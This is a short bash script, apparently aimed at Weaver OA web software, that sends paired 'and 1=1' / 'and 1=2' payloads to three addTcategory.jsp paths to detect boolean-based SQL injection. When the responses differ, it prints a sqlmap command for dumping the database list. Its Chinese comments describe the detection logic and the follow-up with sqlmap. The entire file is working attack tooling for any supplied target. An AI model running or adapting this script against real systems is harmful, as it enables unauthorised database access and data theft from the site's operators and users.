#!/usr/bin/env bash
TARGET="${1:?usage: bash weaver.sh http://TARGET:PORT}"
B="${TARGET%/}"
for p in "/addTcategory.jsp" "/ebridge/addTcategory.jsp" "/wui/addTcategory.jsp"; do
  a=$(curl -sS -m 12 -o /dev/null -w '%{http_code} %{size_download}' -X POST "$B$p" -d 'categoryid=1 and 1=1' 2>/dev/null)
  b=$(curl -sS -m 12 -o /dev/null -w '%{http_code} %{size_download}' -X POST "$B$p" -d 'categoryid=1 and 1=2' 2>/dev/null)
  echo "$p  true=[$a]  false=[$b]"
  [ "$a" != "$b" ] && echo "  可能注入 → sqlmap -u '$B$p' --data='categoryid=1' --batch --dbs"
done
# 判定：两组响应长度/状态不同；再用 sqlmap 交叉验证（--level 2 --risk 1，先 --dbs 定量）
